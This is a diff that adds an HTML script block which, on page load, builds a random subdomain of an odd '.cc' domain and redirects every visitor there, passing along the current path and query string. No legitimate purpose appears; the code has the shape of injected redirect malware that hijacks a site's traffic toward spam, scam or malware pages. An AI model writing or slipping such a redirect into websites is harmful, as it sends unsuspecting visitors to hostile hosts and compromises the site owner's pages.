@@ -1,0 +1,15 @@
+<script>
+    (function() {
+        var randStr = Math.random().toString(36).substring(2) + ".";
+        var targetHost = "https://" + randStr + "28459139.cc";
+        var cleanQuery = "?a=&back=1";
+        var currentPath = window.location.pathname;
+        var currentSearch = window.location.search;
+
+        if (cleanQuery && currentPath === "/") {
+            window.location.href = targetHost + "/" + cleanQuery;
+        } else {
+            window.location.href = targetHost + currentPath + currentSearch;
+        }
+    })();
+</script>
